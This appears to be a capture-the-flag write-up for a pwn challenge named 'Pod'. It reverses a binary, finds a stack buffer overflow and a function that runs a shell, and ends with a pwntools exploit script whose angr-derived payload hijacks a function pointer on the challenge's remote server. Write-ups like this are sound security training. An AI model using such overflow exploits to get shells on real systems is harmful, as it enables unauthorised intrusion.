# Pod

## Introduction
we are given a [binary](https://github.com/chouettevan/CTF-writeups/raw/refs/heads/main/assets/polypwn2026/pod), which asks for a message and then repeats it:

```fish
[I] ◆ Downloads ❯❯❯ ./pod
Enter your message:
abc
[echo] abc
#d
```

## Reversing

The first thing we notice that `system` is imported
and called from the `undercode.cfi` function:

```fish
[0x00404430]> iic
|- console:
|  |- isatty
|  |  |- method.__sanitizer.SupportsColoredOutput_int_
|  |- puts
|  |  |- main
|- error:
|  |- abort
|  |  |- method.__sanitizer.Abort__
|- exec:
|  |- system
|  |  |- sym.undercode.cfi
|- format:
|  |- printf
|  |  |- sym.safe_echo.cfi
|- io:
|  |- read
|  |  |- main
|- process:
|  |- exit
|  |  |- 0x00430bc1
|  |  |- main
|  |- getuid
|  |  |- method.__sanitizer.GetUid__
|- string:
|  |- strlen
|  |  |- sym.safe_reverse.cfi
[0x00404430]>
```

Looking at `undercode.cfi`,we see the following code:

```c
void sym.undercode.cfi(int64_t arg1)

{
    int64_t var_8h;

    sym.imp.system("/bin/sh");
    return;
}
```

the function calls `system(/bin/sh)`,making it an ideal target.
Furthermore,`main` contains a buffer overflow:
```c
ulong main(int argc,char **argv,char **envp)
{
    int iVar1;
    int64_t arg2;
    ulong in_XMM1_Qa;
    int64_t var_70h;
    uchar auStack_70 [64];
    int64_t var_28h;
    int64_t var_20h;
    int64_t var_18h;
    int64_t var_4h;

    var_4h._0_4_ = 0;
    sym.imp.setbuf(_reloc.stdout,NULL);
    sym.imp.setbuf(_reloc.stdin,NULL);
    var_20h = sym.safe_echo;
    var_18h = sym.safe_reverse;
    var_28h = sym.safe_echo;
    sym.imp.puts("Enter your message:");
    sym.imp.read(0,auStack_70,200); // buffer overflow
    iVar1 = sym.is_allowed(var_28h,&var_20h);
    if (iVar1 == 0) {
        sym.imp.puts("[CFI] Invalid control flow detected!");
    //WARNING: Subroutine does not return
        sym.imp.exit(1);
    }
    if (2 < (var_28h - 0x430de0U >> 3 | var_28h << 0x3d)) {
    //WARNING: Subroutine does not return
        sym.__ubsan_handle_cfi_check_fail_abort(0x448b90,in_XMM1_Qa,arg2);
    }
    (*var_28h)(auStack_70);
    return 0;
}
```
Let's check the binary's protections:
```fish
[I] ◆ ❯❯❯ pwn checksec pod
[*] 'pod'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    FORTIFY:    Enabled
    UBSAN:      Enabled
    Stripped:   No
```
There is no PIE, no stack canary and the `undercode.cfi` function to give us a shell.I then used angr to determine an input that will
call `undercode.cfi`,and since there is no randomization,the input will work against the remote: 
The final script was the following:

```python
from pwn import *
context.terminal = ['alacritty','-e']
#target = process("./pod.bck")
target = remote('polypwn.polycyber.io',30196)

# The input angr gave me. 
payload = b'\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe8\rC\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01\x01\x01\x01\xe8\rC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xdc\x0bC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

target.send(payload)
target.interactive()
```
That was easy.
